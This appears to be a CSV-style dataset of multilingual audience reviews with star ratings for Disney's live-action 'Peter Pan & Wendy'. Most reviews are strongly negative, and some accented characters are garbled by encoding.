"Good intention in wanting to do a restart, but the only salvageable thing about this movie would be the performance of Ever Anderson and Jude Law.",2.5
Solo dir√© que destruyeron por complelto los personajes... Que tristeza.,0.5
"Muito devagar; os gr√°ficos est√£o p√©ssimos, digno de filmes de 2000; os atores em alguns momentos, parecia um teatro de escola, onde vc fala algo e espera ver se o coleguinha se toca e fala a linha dele. Muito ruim. N√£o sou de dormir em filme, mas nesse dormi 5 vezes.",1
"The casting choice for Peter Pan himself lacks of magic, doesn't take me to the original story. Thinker bell was great but Peter, hmmm. Also the new twist on classic stories is not working the way they want.",1

Al√©m tamb√©m da invers√£o de valores do que √© ser do bem e ser do mau e do rebaixamento do personagem de Peter e a exagerada exalta√ß√£o da personagem Wend. N√£o tem problema fazer pequenas adapta√ß√µes, mas aqui desmontaram totalmente o filme.",1
"Lost old morals, washed out personalities... all that's left are pretty sights",1
"The audience is being unreasonably harsh here. Jude Law is a thespian. That was the best Captain Hook I had ever seen. He was great. Eh, the kids were kids. The humor here was delightful. I'm taking points away, because I have no desire to see it again.",2.5
"The screen needs to be brightened in order to see Peterpan. When they flew up feeling not very smooth. I was looking forward to the end really disappointed, the 2003 version is a perfect example of what you can learn.",0.5
"The bonafied critics gave it 62%? I'm becoming less and less trusting of their judgment these days. This was just an awful mess and watching flicks like this make me think that, where we've come a long way in digital effects, overall, we've lost a lot in knowing how to tell a story. The twist to the classic tale wasn't bad, but it was just so poorly done. One of the biggest problems of this movie is how flat a character and all-out unlikable Pan is. The classic Peter Pan was arrogant, but that had more to do with his innocence. This Pan is just a brat and not endearing enough to pull it off. And the actor wasn't right for the part. Hammed up and cringeworthy. The effects were good, but everything else was either ho-hum or didn't quite hit the mark, and that twist I mentioned? Came out of nowhere. It did not feel earned. There were a lot of things under-developed, too, like who Wendy was and what made her significant. Overall, a decent concept but really not fleshed out well. Jude Law made a much better Hook than I would have thought. He and Jim Gaffigan as Smee were the bright spots for me, but more to do with their acting than the writing.",1
"This is a joke, just like the rest of disney reboots.",0.5
This Peter Pan looks like a Nerdy instead of wisely. The crocodile is creeping. You better watch the cartoon version of 1953.,1

"Infelizmente o filme √© fraco, mal feito e com mudan√ßas que deixaram os personagens sem carisma algum.

"Acabaram com o filme. Existem v√°rios filmes que s√£o realmente problem√°ticos e mereciam uma reformula√ß√£o. Peter Pan n√£o √© o caso! Essa hist√≥ria j√° era maravilhosa e tinha uma mensagem importante, mensagem essa que a Disney destruiu!",1
"Fantastic Peter Pan movie! Graphics were amazing, actors chosen for the various roles were beyond perfect, & acting was on point as always! If you're looking for a good, wholesome family movie to watch with your kids, this is it! My kids absolutely loved it and this movie keeps things exciting so that it'll keep your kid's attention the entire movie! Warning~ Your kids will be pretending to fly around like Wendy & Peter Pan after watching this movie and be inspired to let their imaginations sore to far off lands! ‚ù§Ô∏è",5
"Honestly, not sure why this movie is even titled with Peter Pan as Wendy can do it all. You will need you lights completely turned off in the whole house as it appears the director couldn't afford decent lighting for the movie and the CGI is atrocious. I was squinting the whole time trying to even see what was going on.",0.5
It was hard too watch it was so bad. So disappointing that I'm gonna drop my disney + subscription after being loyal since day 1!! Not sure what happened to Disney but they really keep making horrible movies!,0.5
One of the most boring and unimaginative movies I've ever seen.,0.5
"What did we as Peter Pan fans do to deserve this? The lightheartedness, magic, and whimsy was replaced with lifeless, dour, and downright acerbic acting by Peter Pan and Tinkerbell. I am so, so sorry that Jude Law had to stoop to the level of this movie and I hope that he was paid handsomely to do so with such poor writing. When you look for magic and adventure as a child, you want bright colors, fantastical settings, and actors that have that sense of wonder about them. This live version of Peter Pan could be compared to laboring in the halls of Tartarus while dreading each moment of gloom soon to come. This cannot be Peter Pan. I refuse to believe that anyone with a sense of the actual text or story greenlit this. Erase this film from your memory and pretend that it never existed.",0.5

"Wow. Just Wow. Watching Disney fail in slow motion is something I am really enjoying. I hated how they went after kids to make money and now they are on the fast path to total cultural irrelevance. This film is total goo. It has no redeeming values. My advice to you is burn your money, at least from the flames you will get a bit of warmth.",0.5
"The movie is bad from the beginning, I feel that it goes too fast, not counting the special effects and not counting its silly progressivism, it is poor to see how Peter Pan was brought down to this level, a waste of time if you are going to see this movie .",0.5
"La pelicula es aburrida, tiene un mal gui√≥n, arruinan el clasico de Disney, Peter Pan es un in√∫til que no puede hacer nada, le quitan la magia, la gracia, lo increible a la pelicula original, todo se ve t√©trico, horrible, lugubre en vez de verse m√°gico, los efectos especiales son muy malos, la pel√≠cula en general es muy mala en todos su aspectos. no se como es posible que un producto tan mediocre pasara todos los filtros y le dieran el visto bueno, no tiene sentido.",0.5
I think overall they made neverland look less exciting as they did in the original. instead of wild plants mermaids fairies you get flat grass and nothingness. Hooks hand is in accurate and tick-tock croc does not tick or tock they turned flying un-aging god into a scared little boy .hook has a bit of character development and completely forgets it 2 seconds later.but a pro is that they were inclusive with the lost boys and they took out the controversial parts they did on the Native Americans.,2
"A Peter Pan movie where Peter Pan isn't even the hero. He's saved by those around him more times than not. In fact, he's more the villian than Captain Hook at times. They gave a backstory to Hook, saying he was an original Lost Boy, who missed his mother. So Peter cast him out of Neverland. Hook got lost and was taken in by pirates, and when he found his way back, Peter cut off his hand as a punishment for returning. That's not what a protagonist does in a child's movie. Aside from that destruction of the main character, Wendy isn't (and doesn't want to be) a mother, like the original cartoon. They took out her main personality trait without giving her a new one. Neverland is usually shown as wondrous, magical, bright, and vibrant. Instead, they chose to have the land they travel through dark and bland. Finally, Jude Law does his best to make Captain Hook shine, but alongside a cast of high school drama quality actors, it looks and sounds as bad as the Lion King remake when they put a superstar like Beyonc√©'s voice alongside Donald Glover.",0.5

"Can Disney stop rebooting classics? I went to watch this movie with my wife because we grew up watching the original and back when Disney had atleast a slight ounce of creativity left in them.

"I liked most live action adaptations and have been a huge fan of Disney movies especially Marvel, Star Wars and movies like Moana. But this was so bad I turned it off after 30 minutes. Peter Pan is a side character with no emotion. Tiger lily is just thrown in with no rhyme or reason. I could go on but read any other 1-3 star reviews and they say all that needs to be said.",0.5
Wow... not even scraping the bottom of the barrel... there's no barrel anymore to scrap from.,0.5
"Peter Pan is een teleurstellende film die er niet in slaagt de magie en betovering van het klassieke Peter Pan-verhaal tot leven te brengen. De film lijdt onder een slecht geschreven scenario en een gebrek aan diepgang in de personages. Het grootste probleem van de film is de zwakke verhaallijn. Het verhaal voelt rommelig en onsamenhangend aan, zonder een duidelijk doel of spanningsopbouw. Het lijkt alsof de makers moeite hebben gehad om een interessant plot te bedenken dat recht doet aan het originele verhaal van Peter Pan. Daarnaast ontbreekt het de personages aan diepgang. Peter Pan, Wendy en de andere bekende personages worden oppervlakkig neergezet en hebben weinig ontwikkeling gedurende de film. Dit maakt het moeilijk om met hen mee te leven of ge√Ønvesteerd te raken in hun avonturen. Ook de visuele effecten zijn ondermaats. De magische momenten die zo belangrijk zijn voor het Peter Pan-verhaal, zoals het vliegen of de ontmoeting met Tinkerbell, komen niet overtuigend over en missen de verbeeldingskracht die je zou verwachten. Hoewel er enkele momenten van humor en actie zijn, zijn deze niet genoeg om de zwakheden van de film te compenseren. Het resultaat is een onge√Ønspireerde en vlakke interpretatie van het Peter Pan-verhaal. Al met al kan ik ""Peter Pan's Puzzling Adventure"" niet aanbevelen aan liefhebbers van Peter Pan of kwaliteitsfilms in het algemeen. Het is een teleurstellende filmervaring die de charme en magie van het originele verhaal mist.",0.5
"Yea, found my phone more interesting, Disney have managed to suck the magic out of this aswell,shame......",0.5
Not Peter Pan. Yet another soulless cash grab from the corporate media sludge factory. Skip this drivel. Read the original to your children and watch the original animated adaptation.,0.5
"This version was totally unnecesary and it is terrible, what a waste of time.",0.5
"No no no no no. I felt Peter and Hook were well cast. Everything else was so bad I hated it so much. How do you mess up casting Mrs. Darling?? Tinkerbell's wings looked awful - bad CGI. They just got everything wrong. So dark, so not fun like it should be.",0.5
"Borrando las reviews no van a conseguir enga√±ar a nadie, disney va cuesta abajo, propulsada y sin frenos",0.5
"Another destruction by Disney of a classic movie that we all grew up loving. How badly do they hate their customers? No wonder Illumination reigns supreme at the box office. Boring, uninspiring, bland....just some of the words that can be used to describe the film.",0.5
"This is nothing similar to the source material. Why the remake? Jude Law is only positive, but cannot redeem it.",0.5
"Such a pathetic remake, a wall paint drying is more entertaining than this movie.",1
"""Wendy, Tiger Lilly, Tinker Bell and Lost Diverse Individuals"" was the last straw for me and I cancelled my Disney+ membership. Yes, it is unwatchable. Like all recent Disney ""productions"".",0.5
Wow - i didn't expect much but this was bad. Never mind the casting choices the fact the movie is utterlly boring is the worst crime. Disney have become a joke.,0.5
This movie does capture the modern Disney vibe üòÜ,0.5
the colours were so dark and bland,0.5
"How can someone manage to make Peter Pan boring and uninteresting? Looks impossible doesn't it? Well, watch as much as you possibly can of this bore of a movie and find out!",0.5
"Prefieren hacer pol√≠tica a un buen gui√≥n,p√©simo ritmo y nada que ver con el material original...",0.5
Sometimes you dont redo the good stuff. This is just horrible.... even tho its for kids its still bad..,0.5
Absolutely awful. Betrays the spirit of the book - there is a reason why they were called Lost Boys and why Wendy was written like that. Pan barely features in the film. And an absolute travesty of a film.,0.5
Its awfull. Some action is good and fight scenes but i would love see real Peter pan and Wendy with their orinal roles and behavior. It should be Peter pan who fight with Hook. Not even mention that GIRLS ARE SMARTER TO NOT FALL FROM THE CRADLE. For people i recommend older version of Peter pan.,0.5
"Dull, poorly acted, boring. They managed to take a classic story and make it tiresome and unenjoyable. That was the only impressive thing about the whole film",1
"For a 2023 version of the Peter Pan tale, I found this to be a great addition to a series of stories each representing the time in which they come from. Weather or not you prefer Robin William's, hook, or Disney's animate Pan, Jason Issacs and Sumpters Peter Pan, or my personal favorite would be the Once Upon a Time rendition. Each had their own unique takes on it and would have a fanbase both for and against different choices each story would present. This variation of Peter and Wendy, is a beautifully shot and well casted tale. The visual world building is not as immersive as Hook or Sumpters version, but did come with its own sense of dark tone, and explored the themes of aging, responsibility and sensibility, all through the lens of brotherhood, friendships and self worth, which I feel takes this Pan story to a different place compared to its predecessors. It's worth the watch, maybe not a rewatch, but defiantly well done for what they set out to do.",3.5
pq e corromper a obra e muita falta de vergonha,0.5
"What else is there to say. You've seen the reviews on YouTube. Yes, neverland looks drab and uninspiring compared to other renditions. Yes, the added beats like Pan and Hooks relationship were unnecessary to tell a good story. Yes, If you look too closely at the plot you'll find an increasingly less cohesive story. But, at the end of the day it's just another uncreative Disney remake. I'm rating it this high out of respect for the animators and others who put some actual work in this.",2
"Really bad and boring, even my kids find it unwatchable",0.5
"Yeah. This movie is a big insult to the book that this is based on. The Main Protagonist (A.K.A Wendy the Unbearable) is a very dislikable character in the movie. Tinker bell is almost a arrogant non-protective one who has some super sass to her. Neverland didn't really feel like Neverland. More just like... land? I had some high hopes for Hook. I mean the man started by shooting a man and steping on the door over his corpse. But no... he is a generic Villian with a backstory that has no purpose in the movie and he doesn't die to a croc at the end. If you want to watch a book adaptation, Just watch the superior Hook. Instead of this terrible insult.",0.5
"Could have been interesting to reimagine the story for a modern audience, but this translation from animation to live action came across feeling low budget and made for TV. Younger kids might enjoy it, but then again you may as well just sit then down in front of the original for a better time.",1
Watch Hook instead. This was terrible in new and exciting ways!,0.5
"lixo, volta Disney. O que esta acontecendo cada filme pior que o outro.",0.5
"Thanks for destroying a classic with your ""modernization"", Disney.",0.5
So slow. No build up or back story. Watched the first 30-45 minutes an turned it off. I was excited to see it but very disappointed.,0.5
"This adaptation is further away from J M Barrie original work than any other production, and as such, is lesser for it. Unfortunately, Disney seems to have forgotten that Peter Pan is the hero of this story?? Wendy comes over as quite unlikeable; in the opening scenes, is bullying her brothers and back chatting her mother. The lost boys are now the lost boy and girls. Captain Hook was a Lost Boy. Wendy doesn't want to be a mother?? Wendy is at least seven or eight years older than Peter Pan. The film is a mess, and I hated every minute.",1
"This movie sucks, what the hell with all those poor performance?",0.5
Horrible. The worst.,0.5
"Pat√©tica, nada comparado a los viejos tiempos",0.5
"Not literally but the construct it took to conclude this movie and bring it to live to me wasn't worth the effort, in my eyes maybe in the near or far future a beautiful reboot would have to take shape, we all grow up disney actually like what's going on, is this the turn you've taken maybe i thought wrong seeing how many of us anticipated the movie waiting for a whole new world of wonder just to get the airbag hitting you hard in the face, to some it was awesome but to me NAH. Made my eyes hurt cause in my sense i just had to see it to the end, despite being clueless and all i never knew the meaning until Peter just wanted endless adventures with his best pal hook spoilers alert BOOM. It's more like two friends trapped in an endless loop of tag.",1.5
"Noticeable differences with the Disney classic and the original material. Peter does not feel like the protagonist, and certain characters in History lack development. The best thing was Jude Law as Captain Hook, I liked that they gave him a background, History and reasons for him to be a good villain. The movie isn't bad, but it doesn't do the character justice either.",3
"I have seen many versions of Peter Pan live with Mary Martin and later Cathy Rigby, animated Disney and non animated. However non animated version is worse I have every viewed, Might as dope the Peter Pan and just call this horrid rendition Wendy!",0.5
"Wendy y Garfio son lo mejor de la pel√≠cula, el desarrollo de estos personajes personalmente me agrad√≥ y es lo √∫nico que vale esta media estrella. Lo dem√°s es un remake sin alma y con actuaciones mediocres en conjunto con mal√≠simos efectos especiales.",0.5
Horrible! Para eso podr√≠an haber una pel√≠cula nueva y no con ese nombre,0.5
Que residuos de desecho.,0.5
Absolutely awful from start to finish,1.5
"Aburrida, sin personajes entra√±ables, Peter es un extra y resulta ser el verdadero villano solo para darle trasfondo a Garfio, simplemente rid√≠culo. Efectos especiales o CGI que dejan mucho que desear. Y Nunca Jam√°s nunca se vio tan apagado.",0.5
"Worst version easily, sadly Disney continues the plunge in its movie quality!",0.5
A sad and unnecessary version of a classic.,0.5
And wouldn't it have been better to call the movie Wendy!?? ü§î This is not a Peter Pan movie...,1
"Markets itself as a retelling of Barrie's book and the Disney animated film, but takes an awful lot of liberties with the material. Concepts are referred to from previous knowledge rather than explained or shown to us, and the pacing is lacklustre. The film feels like adding story and backstory to characters which really serves more as a fan service to adults than as good story telling to the children who are supposed to be the target audience. As with many other Disney live action films of late, it feels more like a story retold with unnecessary content meant exclusively for existing fans piled on. Conveniently so, since they pay the tickets. Unfortunately, the quality of the film itself is neglected.",2
"Es una pel√≠cula que deja mucho que desear. Desde la elecci√≥n del reparto hasta la narrativa, todo parece fallar en esta pel√≠cula. La pel√≠cula tiene graves problemas con la coherencia de la trama y la estructura de la historia. Los personajes son mal escritos y no tienen ning√∫n desarrollo real, lo que hace que sea dif√≠cil para el p√∫blico conectarse con ellos. Adem√°s, la actuaci√≥n es completamente ins√≠pida y no transmite ninguna emoci√≥n.",0.5
Sin duda el dinero mueve m√°s que la calidad hoy en d√≠a,0.5
Es super aburrida y no es entretenible,0.5
destruyeron una bonita historia,0.5
Justo me v√≠ la pel√≠cula original hace poco y puedo decir que est√° no le hace justicia ni de cerca. Fue terrible y hasta me dorm√≠.,0.5
The characters were changes drastically..not only in appearance but personalities. Why are there girls now in neverland? Even on the ship? Why does everything have to change. Acting wasn't great. If you didn't know the story prior to watching a lot wouldn't make sense. The ticking of the clock. How he lost his hand. 2 stars is all I can offer this,2
"Rubbish, they ruined the original story and it doesn't have the intelligent logic that the original work has. The director of this movie knows absolutely nothing about anything.",0.5

"Critica Brasileira Especializada. Gosto mais quando a empresa respeita a origem do filme, se trata de um filme escoc√™s, o foco n√£o √© a luta da garota, mas o sonho de algumas crian√ßas de nunca querer crescer, a felicidade simples que t√≠nhamos em nossa inf√¢ncia apenas brincando com os amigos, Peter Pan e o garoto que quis viver para sempre crian√ßa porque achava a vida adulta chata. Porem a atua√ß√£o da sininho foi muito ruim, perto da atua√ß√£o da sininho anterior, n√£o estou falando isso por conta de cor, mas sim pela fei√ß√£o a atua√ß√£o, quando a c√¢mera dava foco a ela n√£o via a atua√ß√£o que demonstrava as emo√ß√µes que estava sentindo. Peter foi apagado porque tudo foi entregue para a Wendi e o que mais demonstra que essa foi a inten√ß√£o do filme, foi a jogada grosseira de ""isso n√£o √© poder de garoto"", era sim o poder de Peter que agora estava com a Wendi. Os cortes no filme tamb√©m foram horriveis.",0.5
"Un asco de pelicula, no recomiendo ir a verla",0.5
"Solo dire que se pasearon de la peor manera es la nostalgia y en la historia original de Disney, para hacer algo tan feo mejor hubieran adaptado la historia original del libro que eso si era un historia oscura",0.5
"Wow, this is awful. All the changes made to fit ""modern audiences"" are terrible. Missing is Wendy's mothers nature, her crush on Peter, tinker bells crush on Peter, etc. she's a girl boss cut and paste character in everything modern Disney. Peter is just laughably bad. This hook is terrible compared to the one from hook and the original. Bland, lifeless, etc. I just hated this movie. Watched the original few days later and wow is it a master piece.",0.5
distorcion de la original,1
"I've tried to watch it and I fall asleep. the first time was with my niece and she fell asleep. and I said I want to watch it to have a better opinion but I can't finish watching it, I fall asleep, it's very bad.",0.5
"It's a waste of time, poor actress who was convinced to act in that horrible adaptation.",0.5
I think that the actor that played Peter Pan was terrible.,1
Super boring. Just wanted the movie to end. Tinker bell was bland. Where was Peter Pan he was barely in the movie. Girl boss Windy‚Ä¶. Hook was good but ruined by the plot. Why was he Peters friend in the past made no since. Fight scenes made no since. They made Neverland feel small. It's terrible. Don't watch it's a waist of your time.,1
Not nearly as bad as lot of people on Facebook were hoping it would be but honestly it's not great either,2.5
"This movie look empty, and gives no feelings",1
"Boring & disjointed. Felt like everyone filmed separately. Felt really low budget in points. The grade also was odd, i felt like i was watching a rip on a USB stick.",1

They completely reimagined the story of Peter Pan without knowing what made it special in the first place,0.5
"devolveme la plata disney, por el plus!!!!",0.5
Unlikable characters and a story eschewing classic important lessons. Entitled showrunners disregarding the source material.,1
"Otro destrozo mas de Disney como ya nos viene acostumbrando no tiene sentido nada en la pel√≠cula, los efectos de campanilla sin brillo ni nada son horribles. El libro de la selva lo protagoniza un Indio ( buen√≠sima la pel√≠cula por cierto ), Aladdin un egipcio, Mulan una China pero la Sirenita y Peter Pan son blanco y hay que cambiarlos, porque para Disney ""blanco caca"".",0.5
Honestly nothing really to say about this movie. It's bland in every aspect. It should just be called Wendy to be honest. It's a meh for me,1.5
Painstaking took the joy out of captain hook,0.5
"It should be called: ""Wendy and useless Peter Pan"" The last boys and girls, but I think it doesnt matter. Yeah that line kills it to me also this line: ""She gots the boys magic"" ""No, that magic belongs to no Boy"" wtf ?",0.5
"It was an okay movie, but I personally didn't like the ending. It was slow, and it was kinda boring. I liked how they made Tinkerbell and how Wendy heard her at the end. That was my favorite scene.",2.5
Es extremadamente aburrida,0.5
Waste of everyones time. Awful retelling. Unlikable characters,0.5
"It was a really good movie. I liked how it had that amazing plot twist about Captain Hook and Peter Pan. But what confuses me is that this movie has a 11% audience review. Did people really hate it that much? Well, if so, this movie is very underrated, critics and audience. What a good movie. I give this a 75%.",4
"Peter looks so young, especially comparing to Wendy and Tinkerbell, that it borders on creepy. Creators realize, that three girls were in love with him right (W, T and TL)?",1
"I truly enjoyed this updated classic. It's a bit more timely and less racist and misogynistic than the original animated version. No, it's not the cartoon you remember. I'm glad it isn't too because the original is pretty embarrassing to watch. It had too many racial stereotypes and unrealistic characters. This new movie recalls moments of the original without talking down to us, and reveals a few new changes and secrets we could never have guessed, so clever! It felt fresh and familiar all at once.",4
"Lento e noioso, cast ridicolo, attori scelti solo per sfamare la loro ansia di inclusivit√†.",1
Such a great tale yet this version takes a wild 2hr journey to no where claiming to be never land. There is nothing really descriptive explaining the story yet it's plotted like it was there all along. It was unappealing visually and the acting played by Wendy was the best and even that was subpar and she gave good deliverance with poor placed dialogue. This is a good transition kid movie from ages 6-9 going from anime to human movie's,1.5
"The movie should stop being called Peter pan, since Peter pan is no longer relevant. They have scrambled history and created something totally different. Bad performances and lousy production, bad dialogues",1
"Can we just stop with Peter Pan films already? We can all agree this story has been done to death, correct?",0.5
I did not like this movie at all.,0.5
Kind of made me want to cancel Disney +.,0.5
I knew It was gonna be bad the moment i watched trailer. But still decided to give it a try. Wasted my time zzZzZ,0.5
"This movie was so drab and dark. The acting was just awful. It makes you question why they remade this at all. It feels like the magic was sucked right on out of it. Nederland looked too normal... I didn't mind the race swamping, that was the least of this films issues. And you actually had Wendy say ""This magic belongs to no boy."" That is why Disney has been loosing fans, this right here. Where was the magic, where is the wonder? It is Peter Bloody Pan how did you manage to make it feel so drab and dare I say pedestrian? Sigh.",0.5
"Just not very good. In fact, I'd say this is about the worst version of the story I've seen. Definitely not up to Disney quality, which is sad given how good some of the other live action remakes have been.",2
Disney is a sinking ship and this movie proves it,0.5
I adored this remake and thought it did a beautiful job with a classic ‚ô°‚ô°‚ô°,5
Is this a joke? Disney is not taking entertainment seriously,0.5
Es mala nada que ver con la original,0.5
"They missed the mark with this one. Peter Pan can be made Great, or like this. It is dark, lacking the fun and playfullness of previous iterations. Its like Neverland has gone through a nuclear war, and some depressed leftover gangs battle It out.",0.5
The movie was slow. It had all the check boxes checked for a modern movie but just did not have the magic of the animated film. Definitely not worth watching.,1
"Box ticking at its finest. Terrible, wooden acting, should have just left it alone",0.5
"Plot was bad and forced to the limit, horrible CGI, it was not what I was expecting for...",0.5

WOW! why the hell did you even put peter pan in the movie in the first place...,1
man that was terrible,0.5
"Muy Mala, historia sin emoci√≥n, muy fome. Efectos malos, parecen de muy bajo presupuesto.-",0.5
"The live-action adaptation of Peter Pan falls short of expectations, and not in a good way. While the film attempts to breathe new life into the beloved story, it ends up being a confusing mess that strays too far from the original material. Fans of the original movie will be disappointed by the drastic changes to the storyline, characters, and overall tone. One of the biggest problems with this adaptation is the lack of emotional depth and character development. The main characters feel flat and one-dimensional, and the relationships between them are poorly fleshed out. The dialogue is clunky and uninspired, failing to capture the wit and charm of the original film. Furthermore, the visual effects are lackluster and fail to capture the magical atmosphere of the original movie. The film's attempts to modernize the story fall flat, with cringe-worthy references and awkward attempts at humor. Overall, this live-action adaptation is a missed opportunity to do justice to a beloved classic. Deviating so far from the original story and characters only serves to detract from the movie's overall appeal. Fans of the original should avoid this adaptation and stick with the timeless original.",1
"Bad narrative, nothing related to the classic movie, the essence is lost.",0.5
Its really dark and not fun for the children. Such a shame the direction went this way. It could have been brilliant in the right hands.,2
This movie is offensive.,0.5
"Worst peter pan movie ever, absolutely the most awful cheesy, terrible excuse of a classic movie",0.5
Pretty boring I fell asleep after 15 minutes,1
just another D+ misstep. even the cg was awful,0.5
I can't explain it but something about the movie made it so boring and I feel like it doesn't need a higher rating than mine,0.5
"It lost its original message, boring, bad cgi, and a story with no flavor. very sad",0.5
"Esta pel√≠cula es como pedir un bocadillo de pollo especial con todo, y el camarero te dice: ok, pero no le voy a poner tomate, la lechuga... paso, el huevo y el pollo tampoco. Al final no tienes lo que quieres, ni sabe parecido. S√≥lo su nombre",0.5
"I understand the need to carefully dance around so many issues of the original. Then you have to modernize it, with a very carefully crafted message. But that's all your going to see here, is that attempt. It just isn't fun though.",1
Another quick buck for Disney. Where has the magic gone? Another awful remake,0.5
"I saw the movie giving it a chance, because I have a little daughter and she convinced me to put it on, but she told me if those girls were stupid or because they were in neverland.",0.5

"A joke and an insult to a classic, i feel sorry for this generation as they get only very bad remakes made by incompentent writers and more incompentent producers",0.5
barely resembles the source material plus it is boring and looks cheap.,1
Disgraceful and a mockery to the legacy of Peter Pan.,0.5
The movie speaks for itself.,0.5
All the money in the world to remake these classics and they opt to hand the keys over to emotionally bankrupt self interested writers who couldn't care less about the lessons of the story. Just more opportunities to weave their own contemporary philosophies into classics hoping to alter the world into their point of view rather than just make a great adaptation of a timeless classic.,1
"Tried to prewatch for my kid and couldn't finish it. It was so bad. So, so bad. Direction was slow, there was none of the joy or magic that made Peter whimiscal and almost evil with childishness. None of the original story's themes were really on display. I'm not even sure what the point was, honestly, or who this was for. Kids wouldn't appreciate it. Teens would laugh at how cringeworthy it is, and how boring, and how bad the cgi was, and adults would only feel like it was too much of a deviation from the classic Pan that Disney Anination brought us. I'm confused by the concept, the script, the direction choices, the casting, and the delivery.",1
Tis is not Peter Pan and Wendy... it is Wendy.,1
"Came into it open minded hoping that it would not be as bad as other reviewers had said.....but nope, it really is that bad. This story is not Peter Pan. Disney needs to stop pandering to ""modern audiences"".",0.5
"Avevano due idee buone. Le hanno unite per fare un film unico. Ma cos√≠ facendo non hanno dato spazio a nessuna delle due idee. Spoiler: - l'idea di Wendy che √® una ragazzina grande che si sente ancora una bambina e deve crescere. Non mi piace personalmente, ma se sviluppata bene era una bella idea. - l'idea di avere capitan uncino legato a Peter Pan. Una bella idea. Affascinante. Ma relega Peter a villan della storia! Inoltre l'isola che non c√® √® un irlanda vuota. Fredda. Sembra una punizione. La tana dei bimbi sperduti √® una torre in rovina. Per nulla vissuta da qualsivoglia bambino. Fredda. Vuota. Ma lo scenografo ha mai visto la cameretta di un bambino? Ha mai visto come un bambino modifica il proprio ambiente? Inoltre il digetot peggiore: Per rendere Wendy una donna forte, hanno optato per l'idea pi√∫ pigra √® stupida: denigrano il maschio Peter. Lo rendono stupido, incapace e borioso. Peter √® sempre stato un ingenuo e borioso. Si. Ma perch√® √® un bambino! Qui lo hanno devastato. Hanno decostruito il suo personaggio per trasmettere un messaggio che poteva essere trasmesso in modo migliori. Pessimo.",0.5
"Low quality, the movie looks like there is no budget.",0.5
Honest the actual story of Peter Pan is timeless but the live action movie of it made me feel sorry for these child actors that will have it forever attached to their name,0.5
No one want's this Disney!,0.5
Another failed remake. Disney wont listen,0.5
"Shame as my son is 6 and i was hoping he would have something to enjoy here. Very bleak rendition, made Peter into an unlikable character with the Hook storyline. Jude law performance earnt this 1/2 a star as he is trying his best with a terrible script. Casting was good but they had nothing to work with. This should be an easy film to make into a financial success? Disappointing",0.5
"Soulless remake of one of my favorite classics‚Ä¶ it almost manages to be worse than Mulan. No character growth, no plot depth :/",0.5
"Peter Pan and Wendy takes flight in this enchanting live-action adaptation of J.M. Barrie's classic tale. Directed by David Lowery and produced by Walt Disney Pictures, the film captures the magic of Neverland with stunning visuals, captivating performances, and a perfect balance of adventure, humor, and heartfelt moments. With a talented cast bringing beloved characters to life, a whimsical score that elevates the storytelling, and a fresh perspective that pays homage to the original while adding its own charm, ""Peter Pan and Wendy"" is a delightful journey that reminds audiences of the enduring power of imagination and the beauty of never growing up.",0.5
Awful they changed everything it wasn't peter pan it wasn't the lost boys it wasn't tinker bell,0.5
TERRIBLE! ABSOLUTELY TERRIBLE! why does disney keeps making live action movies! THE ACTOR WHO PLAYED PETER WAS GREAT! but a wendy centric movie?! oh fucking come on! seriously?,1
Such a boring movie. Has to be the worst version ever made. Pro's: The moment my niece fell asleep I could turn it off. Con's: The rest of the movie,0.5
"Too many problems to list, so I will cover one really poor decision. The father and Wendy related arcs are gone. You have Alan Tudyk as the father and Jude Lawas Hook, that is a one actor two role. That's the whole damn point. The dueling journey of Wendy realizing the risks of staying a child forever versus the father remembering that it is okay for his child to hold onto youth a bit longer. Having the same actor join in the fantasy is a great tradition. It allows for Hook to be a caricature villain, the depth coming from his real world counterpart. But why does that matter here anyway. This isn't Wendy. She's a void. The heart of the damn story is gone. They wrote all her endearing qualities away. Just a husk, not even wanting to maintain childhood. And as a quick aside, the race swapping issues matter not to me. The poor casting does. I'd be fine Peter Pan were a purple alien as long as he doesn't deliver his lines like a newsreader. Sorry kid, you were not the best choice.",1
Soulless and colorless mess,1
Should be called. Wendy & Peter Who. . . ? Terrible in every way.,0.5
Peter Pan & Wendy was ok. They did a great job with the special effects but they should have given the boy playing Peter Pan better directions. Still think he can be a good actor but I feel they spent too little time helping him and they focus on the actress playing Wendy too much.,3.5
Why so serious and dark,0.5
"Jude Law's performance was notable, but the movie was highly disappointing. Every opportunity for life, wonder, and imagination in the characters seemed to be squandered for something that might pass as a Hallmark movie. Really bummed. It takes a lot to ruin Tinker Bell.",0.5
"Not engaging at all, went in not knowing any of the details or strife surrounding the remake and it was just dull and never really got going. I would not recommend and am upset I started and finished it.",0.5
"It is the most boring movie I saw this 2023, it is not a live action. the lion king was a live act from the animated movie but peter pan is another story here only wendy appears i can swear i never got so bored watching a movie.",0.5

"Peter Pan is meant to be the charismatic embodiment of eternal youth and Neverland is meant to represent an enticing, reckless wonderland... but this movie showed open disdain for the story's most fundamental elements. It got everything wrong and was boring while it missed it's mark. Go watch Hook instead.",0.5
It was a total cash grab by Disney this movie was the worst of the year,0.5
"I absolutely loved this version! It was so well balanced and inclusive, while exciting & adventurous! A+++++",5
It's bad as the new Pinocchio movie. Really not recommended to watch this movie on Disney Plus.,0.5
Didn't completely suck... Couple of song hit the right spot... The movie though not at all,2
"we try warn Disney every time but they don't listen, they never listen to his audience, they want remake everything from the past, this not works, make something new, leave the past alone, you're losing all his fans left. the movie was so poor, wendy everytime trying be better than the protagonist and changing the whole source material was dumb.",0.5
It is wrong to remove scores from any review. Review bombing or not this is how people feel about the movie and they are allowed this.,0.5
Paint by numbers Disney remake. Unimaginative and does a disservice to the entire franchise and original theme/storytelling.,0.5
Peter ‚Äòpandering'! Horrible acting and too many ridiculous changes to the original story. No thanks!,0.5
One of the worst live action adaptions of a Disney animation.,0.5
I had a hard differentiating the characters from how we use to see them while keeping up with the terrible plot,0.5
The worst adaptation of Peter Pan. Hook all the way.,0.5
"This does not feel like the story. They want to sell me nostalgia, but everything is swapped etc.",0.5
"Wow I watched this expecting a typical current Disney train wreck, but it exceed all my low expectations in a bad way.",1.5
"This is a terrible movie. 1/2 star doesn't even do it justice... They somehow strayed completely from the original while also staying too close to it at the same time. They made Hook a super lame balding man, Wendy is a complete know-it-all, and Peter Pan is a brat with no redeeming qualities. The lost boys just suck now, and it is sooooo boring. 2/4 of the people watching this with me fell asleep, and I just don't know how you can make a movie so bad. They made Hook blue! BLUE! He is supposed to be red, and wear that fancy shmancy hat, but he isn't doing either! I didn't even watch past an hour, so I apologize if it is like a big part of the movie where he starts wearing red, but think about that, I couldn't make it past the hour mark. This is too long a movie, and I beg of you, please do not watch it. For your own sake.",0.5
